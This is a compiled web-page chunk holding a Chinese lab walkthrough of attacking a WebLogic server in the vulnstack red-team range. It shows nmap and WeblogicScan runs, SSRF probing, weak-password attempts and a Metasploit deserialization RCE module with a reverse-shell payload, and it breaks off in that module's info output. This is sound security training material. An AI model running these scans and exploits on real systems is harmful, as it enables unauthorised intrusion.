import{_ as i,c as t,a as n,b as l,d as a,e as p,r as c,o}from"./app-CUDFWA7u.js";const r="/blog/assets/topology_diagram-8WDwIqQK.jpg",u="/blog/assets/image-20220902201716802-Dd8BoAXo.png",d="/blog/assets/image-20220902221502005-DHzWXkay.png",m="/blog/assets/image-20220902224528402-Do6p0cdS.png",v="/blog/assets/image-20220902224701716-BPRpW_Od.png",b="/blog/assets/image-20220902225317616-kQj-UGFz.png",k="/blog/assets/image-20220903163549673-CiA_1sby.png",g="/blog/assets/image-20220903164500501-2H2x3rVP.png",h="/blog/assets/image-20220903164404229-jrdQGbA2.png",_="/blog/assets/image-20220902232152055-oq_Oz72p.png",f="/blog/assets/image-20220902231847909-DnoYSWyI.png",y="/blog/assets/image-20220902231857759-mimncWPt.png",x="/blog/assets/image-20220903203027582-CvoFaUNr.png",S="/blog/assets/image-20220904154513063-ChMWM2fv.png",w="/blog/assets/image-20220903203424470-BIjxkeyz.png",C="/blog/assets/image-20220903212150178-CGo0zp4f.png",T="/blog/assets/image-20220903212428237-DCfnN20e.png",E="/blog/assets/image-20220903213155825-DDKfohLR.png",D="/blog/assets/image-20220903213352928-C0z1Kzfe.png",R="/blog/assets/image-20220904160410608-B7jIPKnn.png",A="/blog/assets/image-20220904163431356-juAdQSjr.png",P="/blog/assets/image-20220904163651371-higa_HG5.png",W="/blog/assets/image-20220905193231829-CMnNi2w-.png",M="/blog/assets/image-20220905193450444-tbUa34x0.png",q="/blog/assets/image-20220906012948157-CyNj4HBO.png",V="/blog/assets/image-20220906013521880-DjCIcFZU.png",N="/blog/assets/image-20220906013850233-OdUEFlKk.png",O="/blog/assets/image-20220906014757932-CbRDnZ7C.png",I="/blog/assets/image-20220906235842928-BFbDGPn2.png",B="/blog/assets/image-20220906155511478-B3JsXBix.png",j="/blog/assets/image-20220906235950361-CjiSfKj7.png",z="/blog/assets/image-20220907000127567-C9RW4yej.png",U="/blog/assets/image-20220907153445579-sMDiQZYy.png",F="/blog/assets/image-20220907155321492-DS7inSCa.png",L="/blog/assets/image-20220907162927468-B_90q55O.png",H="/blog/assets/image-20220907163238560-Crr7ego8.png",K="/blog/assets/image-20220908182619727-Bs2HZmGX.png",G="/blog/assets/image-20220908183702411-BVV1_QeE.png",Y="/blog/assets/image-20220908184546973-B_7geZDX.png",Z="/blog/assets/image-20220909000002317-f5sc3N61.png",J="/blog/assets/image-20220909000024118-CTuu51gU.png",X={},Q={href:"http://vulnstack.qiyuanxuetang.net/vuln/detail/3/",target:"_blank",rel:"noopener noreferrer"},$={href:"https://github.com/dr0op/WeblogicScan",target:"_blank",rel:"noopener noreferrer"},ss={href:"https://github.com/rebeyond/Behinder",target:"_blank",rel:"noopener noreferrer"},ns={href:"https://www.oracle.com/java/technologies/downloads/",target:"_blank",rel:"noopener noreferrer"},as={href:"https://github.com/xZero707/Bamcompile",target:"_blank",rel:"noopener noreferrer"};function es(ps,s){const e=c("ExternalLinkIcon");return o(),t("div",null,[s[11]||(s[11]=n("h1",{id:"att-ck实战系列—红队实战-二",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#att-ck实战系列—红队实战-二"},[n("span",null,"ATT&cK实战系列—红队实战(二)")])],-1)),s[12]||(s[12]=n("h2",{id:"环境搭建",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#环境搭建"},[n("span",null,"环境搭建")])],-1)),n("p",null,[n("a",Q,[s[0]||(s[0]=a("漏洞详情 (qiyuanxuetang.net)")),p(e)])]),s[13]||(s[13]=l('<p>拓扑：</p><p><img src="'+r+'" alt="img"></p><h3 id="环境说明" tabindex="-1"><a class="header-anchor" href="#环境说明"><span>环境说明</span></a></h3><p>网络配置：</p><p><img src="'+u+'" alt="image-20220902201716802"></p><p><img src="'+d+`" alt="image-20220902221502005"></p><p>内网网段：10.10.10.1/24</p><p>DMZ网段：192.168.211.1/24</p><p>测试机地址：192.168.211.147（Kali Linux）</p><p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">deny all tcp ports：10.10.10.1</span>
<span class="line">allow all tcp ports：10.10.10.0/24</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="web-机密码错误问题" tabindex="-1"><a class="header-anchor" href="#web-机密码错误问题"><span>Web 机密码错误问题</span></a></h3><p>根据网上资料显示，可恢复快照到 V1.3 解决。</p><p>但是，恢复快照就没意思了，所以用另一种方法，进PE直接把密码给改了：</p><p><img src="`+m+'" alt="image-20220902224528402"></p><p>重启，一个不留神进磁盘检测了，让他扫算了。<s>然而我虚拟机还是在NAS上的不在本地。。。</s></p><p><img src="'+v+'" alt="image-20220902224701716"></p><p>进来了</p><p><img src="'+b+'" alt="image-20220902225317616"></p><h3 id="web-服务配置" tabindex="-1"><a class="header-anchor" href="#web-服务配置"><span>Web 服务配置</span></a></h3><p>Web机器中启用 Web 服务</p><blockquote><p>C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin\\stopWebLogic.cmd ( Request Admin)</p></blockquote><p><img src="'+k+'" alt="image-20220903163549673"></p><p><img src="'+g+'" alt="image-20220903164500501"></p><p>Kali 中尝试访问：</p><p><img src="'+h+'" alt="image-20220903164404229"></p><h3 id="环境确认" tabindex="-1"><a class="header-anchor" href="#环境确认"><span>环境确认</span></a></h3><p>看IP，并确认网络状态正常。</p><blockquote><p>Kali: 192.168.111.128</p><p>Web: 192.168.111.80, 10.10.10.80</p><p>PC: 192.168.111.201, 10.10.10.201</p><p>DC: 10.10.10.10</p></blockquote><p><img src="'+_+'" alt="image-20220902232152055"></p><p><img src="'+f+'" alt="image-20220902231847909"></p><p><img src="'+y+`" alt="image-20220902231857759"></p><h2 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集"><span>信息收集</span></a></h2><p>nmap 扫一下 Web 看看</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># nmap -sS -v 192.168.111.80</span></span>
<span class="line"></span>
<span class="line">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-09-03 04:45 EDT</span>
<span class="line">Initiating ARP Ping Scan at 04:45</span>
<span class="line">Scanning <span class="token number">192.168</span>.111.80 <span class="token punctuation">[</span><span class="token number">1</span> port<span class="token punctuation">]</span></span>
<span class="line">Completed ARP Ping Scan at 04:45, <span class="token number">0</span>.22s elapsed <span class="token punctuation">(</span><span class="token number">1</span> total hosts<span class="token punctuation">)</span></span>
<span class="line">Initiating Parallel DNS resolution of <span class="token number">1</span> host. at 04:45</span>
<span class="line">Completed Parallel DNS resolution of <span class="token number">1</span> host. at 04:45, <span class="token number">0</span>.01s elapsed</span>
<span class="line">Initiating SYN Stealth Scan at 04:45</span>
<span class="line">Scanning <span class="token number">192.168</span>.111.80 <span class="token punctuation">(</span><span class="token number">192.168</span>.111.80<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">1000</span> ports<span class="token punctuation">]</span></span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">445</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">139</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">3389</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">135</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">80</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">49154</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">7001</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">49152</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">49155</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">49153</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Discovered <span class="token function">open</span> port <span class="token number">1433</span>/tcp on <span class="token number">192.168</span>.111.80</span>
<span class="line">Completed SYN Stealth Scan at 04:46, <span class="token number">4</span>.13s elapsed <span class="token punctuation">(</span><span class="token number">1000</span> total ports<span class="token punctuation">)</span></span>
<span class="line">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.111.80 <span class="token punctuation">(</span><span class="token number">192.168</span>.111.80<span class="token punctuation">)</span></span>
<span class="line">Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00031s latency<span class="token punctuation">)</span>.</span>
<span class="line">Not shown: <span class="token number">989</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span></span>
<span class="line">PORT      STATE SERVICE</span>
<span class="line"><span class="token number">80</span>/tcp    <span class="token function">open</span>  http</span>
<span class="line"><span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc</span>
<span class="line"><span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn</span>
<span class="line"><span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds</span>
<span class="line"><span class="token number">1433</span>/tcp  <span class="token function">open</span>  ms-sql-s</span>
<span class="line"><span class="token number">3389</span>/tcp  <span class="token function">open</span>  ms-wbt-server</span>
<span class="line"><span class="token number">7001</span>/tcp  <span class="token function">open</span>  afs3-callback</span>
<span class="line"><span class="token number">49152</span>/tcp <span class="token function">open</span>  unknown</span>
<span class="line"><span class="token number">49153</span>/tcp <span class="token function">open</span>  unknown</span>
<span class="line"><span class="token number">49154</span>/tcp <span class="token function">open</span>  unknown</span>
<span class="line"><span class="token number">49155</span>/tcp <span class="token function">open</span>  unknown</span>
<span class="line">MAC Address: 00:0C:29:5A:92:F5 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line">Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmap</span>
<span class="line">Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">4.50</span> seconds</span>
<span class="line">           Raw packets sent: <span class="token number">1990</span> <span class="token punctuation">(</span><span class="token number">87</span>.544KB<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">12</span> <span class="token punctuation">(</span>512B<span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见 80、135、139、445、1433、3389、7001、49152、49153、49154 端口处于启用状态</p><p><strong>端口分析</strong></p><ul><li>445 端口开放意味着存在 smb 服务，可能存在ms17_010永恒之蓝漏洞。</li><li>139 端口，就存在 Samba 服务，可能存在爆破/未授权访问/远程命令执行漏洞。</li><li>1433 端口，就存在 mssql 服务，可能存在爆破/注入/SA弱口令。</li><li>7001 端口可能存在 Weblogic 反序列化漏洞。</li></ul><p>前面访问80端口的时候可见，里面是空白的没有内容，那直接试试扫7001的 Weblogic 看看有没有漏洞。</p>`,39)),n("p",null,[s[2]||(s[2]=a("工具：")),n("a",$,[s[1]||(s[1]=a("dr0op/WeblogicScan: 增强版WeblogicScan、检测结果更精确、插件化、添加CVE-2019-2618，CVE-2019-2729检测，Python3支持 (github.com)")),p(e)])]),s[14]||(s[14]=l(`<blockquote><p>也可以使用 AWVS</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Documents/Git/WeblogicScan<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># python3 WeblogicScan.py 192.168.111.80 7001</span></span>
<span class="line"></span>
<span class="line">__        __   _     _             _        ____                  </span>
<span class="line"><span class="token punctuation">\\</span> <span class="token punctuation">\\</span>      / /__<span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token operator">|</span> ___   __ _<span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___  / ___<span class="token operator">|</span>  ___ __ _ _ __  </span>
<span class="line"> <span class="token punctuation">\\</span> <span class="token punctuation">\\</span> /<span class="token punctuation">\\</span> / / _ <span class="token punctuation">\\</span> <span class="token string">&#39;_ \\| |/ _ \\ / _\` | |/ __| \\___ \\ / __/ _\` | &#39;</span>_ <span class="token punctuation">\\</span> </span>
<span class="line">  <span class="token punctuation">\\</span> V  V /  __/ <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__   ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span></span>
<span class="line">   <span class="token punctuation">\\</span>_/<span class="token punctuation">\\</span>_/ <span class="token punctuation">\\</span>___<span class="token operator">|</span>_.__/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\\</span>___/ <span class="token punctuation">\\</span>__, <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\\</span>___<span class="token operator">|</span> <span class="token operator">|</span>____/ <span class="token punctuation">\\</span>___<span class="token punctuation">\\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span></span>
<span class="line">                             <span class="token operator">|</span>___/ </span>
<span class="line">      From WeblogicScan V1.2 Fixed by Ra1ndr0op: drops.org.cn <span class="token operator">|</span> V <span class="token number">1.3</span>.1 </span>
<span class="line"></span>
<span class="line">Welcome To WeblogicScan <span class="token operator">!</span><span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 weblogic-console</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>The target Weblogic console address is exposed<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>The path is: http://192.168.111.80:7001/console/login/LoginForm.jsp</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>Please try weak password blasting<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>Weblogic后台路径存在</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 SSRF</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>The target Weblogic UDDI module is exposed<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>The path is: http://192.168.111.80:7001/uddiexplorer/</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>Please verify the SSRF vulnerability<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>SSRF 漏洞存在</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20192725</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>CVE-2019-2725 漏洞存在</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20192729</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>CVE20192729 未成功检测，请检查网络连接或或目标存在负载中间件</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE201710271</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2017-10271</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20173506</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2017-3506</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20192618</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic1</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic10</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic123</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/Oracle@123</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>target Weblogic is not Vul CVE-2019-2618</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20182894</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2018-2894</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20182628</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>CVE20182628 未成功检测，请检查网络连接或或目标存在负载中间件</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20182893</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>CVE20182893 未成功检测，请检查网络连接或或目标存在负载中间件</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20160638</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2016-0638</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20163510</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2016-3510</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20173248</span>
<span class="line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2017-3248</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>有几个检测失败了，返回去 Web 一看，原来是被 360 拦了</p><p><img src="`+x+`" alt="image-20220903203027582"></p><p>不过没关系，不是还有几个能用的，就从这几个入手吧</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">[*]开始检测 SSRF</span>
<span class="line">[+]The target Weblogic UDDI module is exposed!</span>
<span class="line">[+]The path is: http://192.168.111.80:7001/uddiexplorer/</span>
<span class="line">[+]Please verify the SSRF vulnerability!</span>
<span class="line">[+]SSRF 漏洞存在</span>
<span class="line"></span>
<span class="line">[*]开始检测 CVE20192725</span>
<span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</span>
<span class="line">[+]CVE-2019-2725 漏洞存在</span>
<span class="line"></span>
<span class="line">[*]开始检测 CVE20192729</span>
<span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729</span>
<span class="line">[+]CVE-2019-2729 漏洞存在</span>
<span class="line"></span>
<span class="line">[*]开始检测 CVE20173506</span>
<span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506</span>
<span class="line">[+]CVE-2017-3506 漏洞存在</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="后台" tabindex="-1"><a class="header-anchor" href="#后台"><span>后台</span></a></h3><p>访问看一眼：http://192.168.111.80:7001/console/login/LoginForm.jsp</p><p>随便试几个弱密码，失败；</p><p>到网上搜默认密码，失败：</p><p><img src="`+S+'" alt="image-20220904154513063"></p><p>至于爆破，就算了吧。</p><h3 id="ssrf" tabindex="-1"><a class="header-anchor" href="#ssrf"><span>SSRF</span></a></h3><p>到目录里看一下：</p><p><img src="'+w+'" alt="image-20220903203424470"></p><p>到 Search Public Registries 里 Search 一下，并抓包看看</p><p><img src="'+C+'" alt="image-20220903212150178"></p><p><img src="'+T+'" alt="image-20220903212428237"></p><p>看起来 operator 是可更改的参数，更改后可以引起不同的报错</p><p><img src="'+E+'" alt="image-20220903213155825"></p><p><img src="'+D+`" alt="image-20220903213352928"></p><h3 id="cve-2019-2725" tabindex="-1"><a class="header-anchor" href="#cve-2019-2725"><span>CVE-2019-2725</span></a></h3><h4 id="msf" tabindex="-1"><a class="header-anchor" href="#msf"><span>MSF</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> search weblogic_des</span>
<span class="line"></span>
<span class="line">Matching Modules</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></span>
<span class="line"></span>
<span class="line">   <span class="token comment">#  Name                                                          Disclosure Date  Rank       Check  Description</span></span>
<span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span>
<span class="line">   <span class="token number">0</span>  exploit/multi/misc/weblogic_deserialize                       <span class="token number">2018</span>-04-17       manual     Yes    Oracle Weblogic Server Deserialization RCE</span>
<span class="line">   <span class="token number">1</span>  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  <span class="token number">2019</span>-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService</span>
<span class="line">   <span class="token number">2</span>  exploit/multi/misc/weblogic_deserialize_marshalledobject      <span class="token number">2016</span>-07-19       manual     No     Oracle Weblogic Server Deserialization RCE - MarshalledObject</span>
<span class="line">   <span class="token number">3</span>  exploit/multi/misc/weblogic_deserialize_unicastref            <span class="token number">2017</span>-01-25       excellent  No     Oracle Weblogic Server Deserialization RCE - RMI UnicastRef</span>
<span class="line">   <span class="token number">4</span>  exploit/multi/misc/weblogic_deserialize_rawobject             <span class="token number">2015</span>-01-28       excellent  No     Oracle Weblogic Server Deserialization RCE - Raw Object</span>
<span class="line">   <span class="token number">5</span>  exploit/multi/misc/weblogic_deserialize_badattrval            <span class="token number">2020</span>-01-15       normal     Yes    WebLogic Server Deserialization RCE - BadAttributeValueExpException</span>
<span class="line">   <span class="token number">6</span>  exploit/multi/misc/weblogic_deserialize_badattr_extcomp       <span class="token number">2020</span>-04-30       normal     Yes    WebLogic Server Deserialization RCE BadAttributeValueExpException ExtComp</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interact with a module by name or index. For example info <span class="token number">6</span>, use <span class="token number">6</span> or use exploit/multi/misc/weblogic_deserialize_badattr_extcomp</span>
<span class="line"></span>
<span class="line">msf6 <span class="token operator">&gt;</span> use xploit/multi/misc/weblogic_deserialize_asyncresponseservice</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload cmd/unix/reverse_bash</span>
<span class="line"></span>
<span class="line">Matching Modules</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></span>
<span class="line"></span>
<span class="line">   <span class="token comment">#  Name                                                          Disclosure Date  Rank       Check  Description</span></span>
<span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span>
<span class="line">   <span class="token number">0</span>  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  <span class="token number">2019</span>-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interact with a module by name or index. For example info <span class="token number">0</span>, use <span class="token number">0</span> or use exploit/multi/misc/weblogic_deserialize_asyncresponseservice                                                                                                                                    </span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> info</span>
<span class="line"></span>
<span class="line">       Name: Oracle Weblogic Server Deserialization RCE - AsyncResponseService </span>
<span class="line">     Module: exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span>
<span class="line">   Platform: Unix, Windows, Solaris</span>
<span class="line">       Arch: </span>
<span class="line"> Privileged: No</span>
<span class="line">    License: Metasploit Framework License <span class="token punctuation">(</span>BSD<span class="token punctuation">)</span></span>
<span class="line">       Rank: Excellent</span>
<span class="line">  Disclosed: <span class="token number">2019</span>-04-23</span>
<span class="line"></span>
<span class="line">Provided by:</span>
<span class="line">  Andres Rodriguez - 2Secure <span class="token punctuation">(</span>@acamro<span class="token punctuation">)</span> <span class="token operator">&lt;</span>acamro@gmail.com<span class="token operator">&gt;</span></span>
<span class="line"></span>
<span class="line">Available targets:</span>
<span class="line">  Id  Name</span>
<span class="line">  --  ----</span>
<span class="line">  <span class="token number">0</span>   Unix</span>
<span class="line">  <span class="token number">1</span>   Windows</span>
<span class="line">  <span class="token number">2</span>   Solaris</span>
<span class="line"></span>
<span class="line">Check supported:</span>
<span class="line">  Yes</span>
<span class="line"></span>
<span class="line">Basic options:</span>
<span class="line">  Name       Current Setting               Required  Description</span>
<span class="line">  ----       ---------------               --------  -----------</span>
<span class="line">  Proxies                                  no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></span>
<span class="line">  RHOSTS                                   <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Us</span>
<span class="line">                                                     ing-Metasploit</span>
<span class="line">  RPORT      <span class="token number">7001</span>                          <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span></span>
<span class="line">  SSL        <span class="token boolean">false</span>                         no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections</span>
<span class="line">  TARGETURI  /_async/AsyncResponseService  <span class="token function">yes</span>       URL to AsyncResponseService</span>
<span class="line">  VHOST                                    no        HTTP server virtual <span class="token function">host</span></span>
<span class="line"></span>
<span class="line">Payload information:</span>
<span class="line"></span>
<span class="line">Description:</span>
<span class="line">  An unauthenticated attacker with network access to the Oracle </span>
<span class="line">  Weblogic Server T3 interface can send a malicious SOAP request to </span>
<span class="line">  the interface WLS AsyncResponseService to execute code on the </span>
<span class="line">  vulnerable host.</span>
<span class="line"></span>
<span class="line">References:</span>
<span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-10271</span>
<span class="line">  CNVD-C <span class="token punctuation">(</span><span class="token number">2019</span>-48814<span class="token punctuation">)</span></span>
